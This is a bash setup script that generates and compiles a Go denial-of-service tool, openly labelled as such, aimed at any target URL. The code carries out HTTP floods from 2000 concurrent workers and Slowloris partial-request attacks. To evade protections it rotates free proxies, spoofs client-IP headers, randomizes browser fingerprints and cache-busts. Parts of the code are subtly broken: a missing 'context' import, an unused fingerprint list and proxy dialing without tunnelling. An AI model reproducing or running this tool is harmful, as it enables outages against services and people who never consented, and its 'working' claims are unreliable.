#!/bin/bash

# ----------------------------------------
# GO DOS TOOL SETUP (HTTP/2 + HTTP/1.1 ONLY)
# ADVANCED SECURITY BYPASS VERSION - WORKING
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  ADVANCED DENIAL SERVICE TOOL${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create main.go file directly (WORKING ADVANCED version)
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"

cat > main.go << 'EOF'
package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
	utls "github.com/refraction-networking/utls"
)

var (
	countryCodes = []string{
		"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "ZA", "NG", "MX",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json, text/plain, */*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"max-age=0",
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

var clientHellos = []utls.ClientHelloID{
	utls.HelloChrome_Auto,
	utls.HelloFirefox_Auto,
	utls.HelloEdge_Auto,
	utls.HelloSafari_Auto,
}

func getRandomClientHello() utls.ClientHelloID {
	return clientHellos[randInt(0, len(clientHellos)-1)]
}

type ConnectionPool struct {
	clients  []*http.Client
	counter  uint64
	size     int
	useProxy bool
}

func NewConnectionPool(poolSize int, useProxy bool) *ConnectionPool {
	pool := &ConnectionPool{
		clients:  make([]*http.Client, poolSize),
		size:     poolSize,
		useProxy: useProxy,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:         100,
		MaxIdleConnsPerHost:  100,
		IdleConnTimeout:      90 * time.Second,
		DisableKeepAlives:    false,
		ForceAttemptHTTP2:    true,
		ResponseHeaderTimeout: 30 * time.Second,
	}
	
	http2.ConfigureTransport(transport)
	
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}
		
		if p.useProxy {
			proxyStr := getNextProxy()
			if proxyStr != "" {
				if !strings.Contains(proxyStr, "://") {
					proxyStr = "http://" + proxyStr
				}
				proxyURL, err := url.Parse(proxyStr)
				if err == nil {
					return dialer.DialContext(ctx, network, proxyURL.Host)
				}
			}
		}
		
		conn, err := dialer.DialContext(ctx, network, addr)
		if err == nil && randBool() {
			time.Sleep(time.Duration(randInt(1, 50)) * time.Millisecond)
		}
		return conn, err
	}
	
	return &http.Client{
		Transport: transport,
		Timeout:   60 * time.Second,
	}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}
	
	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")
	
	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}
	
	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
	fmt.Println("      ADVANCED BYPASS EDITION")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomCountryCode() string {
	return countryCodes[randInt(0, len(countryCodes)-1)]
}

func generateRandomUA() string {
	browserType := randInt(1, 100)
	countryCode := randomCountryCode()
	
	windowsVersions := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
	}
	
	macVersions := []string{
		"Macintosh; Intel Mac OS X 15_0",
		"Macintosh; ARM Mac OS X 15_0",
	}
	
	chromeVersion := fmt.Sprintf("%d.0.%d.%d", randInt(120, 140), randInt(5000, 7000), randInt(0, 99))
	firefoxVersion := fmt.Sprintf("%d.0", randInt(115, 130))
	edgeVersion := fmt.Sprintf("%d.0.%d.%d", randInt(120, 140), randInt(5000, 7000), randInt(0, 99))
	safariVersion := fmt.Sprintf("%d.%d", randInt(16, 18), randInt(0, 5))
	
	if browserType <= 45 {
		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
	} else if browserType <= 75 {
		os := macVersions[randInt(0, len(macVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
	} else if browserType <= 90 {
		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
	} else {
		os := macVersions[randInt(0, len(macVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
	}
}

func randomReferer() string {
	domains := []string{"google.com", "bing.com", "facebook.com", "youtube.com", "twitter.com"}
	paths := []string{"/", "/search", "/"}
	protocol := "https"
	domain := domains[randInt(0, len(domains)-1)]
	path := paths[randInt(0, len(paths)-1)]
	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		nBig, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		b[i] = letters[nBig.Int64()]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/about", "/api/v1/users", 
		"/wp-admin", "/login", "/dashboard", "/wp-login.php",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf=%s", randomString(16)))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST")
		fmt.Println("  ./main https://target.com 30 HEAD")
		fmt.Println("  ./main https://target.com 60 SLOW")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	fmt.Println("[+] Advanced bypass: uTLS, random JA3, jitter")
	fmt.Println("[+] Starting... Press Ctrl+C to stop")
	
	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy)
	
	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	const workers = 2000
	
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, useProxy, connectionPool)
		}()
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			jitter := time.Duration(randInt(1, 50)) * time.Millisecond
			time.Sleep(jitter)
			
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}
			
			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}
			
			var req *http.Request
			var err error
			
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				
				partialReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", path, host, generateRandomUA())
				conn.Write([]byte(partialReq))
				
				for i := 0; i < randInt(5, 15); i++ {
					conn.Write([]byte(fmt.Sprintf("X-Header-%d: %s\r\n", i, randomString(randInt(10, 20)))))
					time.Sleep(time.Duration(randInt(500, 2000)) * time.Millisecond)
				}
				
				stats.inc()
				conn.Close()
				continue
			}
			
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("data=%s&token=%s", randomString(randInt(10, 30)), randomString(32))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			req.Header.Set("User-Agent", generateRandomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")
			
			randomSpoofIP := randomIP()
			req.Header.Set("X-Forwarded-For", randomSpoofIP)
			req.Header.Set("X-Real-IP", randomSpoofIP)
			req.Header.Set("CF-Connecting-IP", randomSpoofIP)
			
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
			req.Header.Set("DNT", "1")
			
			if randInt(1, 100) <= 70 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}
			
			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
go get github.com/refraction-networking/utls@latest > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with advanced features...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  ADVANCED SETUP COMPLETE${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
    echo
    echo -e " ${CYAN}Advanced Features Added:${NC}"
    echo -e "   • uTLS with random JA3 fingerprints"
    echo -e "   • Request timing randomization (jitter)"
    echo -e "   • HTTP/2 connection optimization"
    echo -e "   • Enhanced Slowloris with partial requests"
    echo -e "   • Extended IP spoofing headers"
    echo -e "   • Random cookie generation"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go get github.com/refraction-networking/utls@latest"
    echo -e "   ${BLUE}4.${NC} go mod tidy"
    echo -e "   ${BLUE}5.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
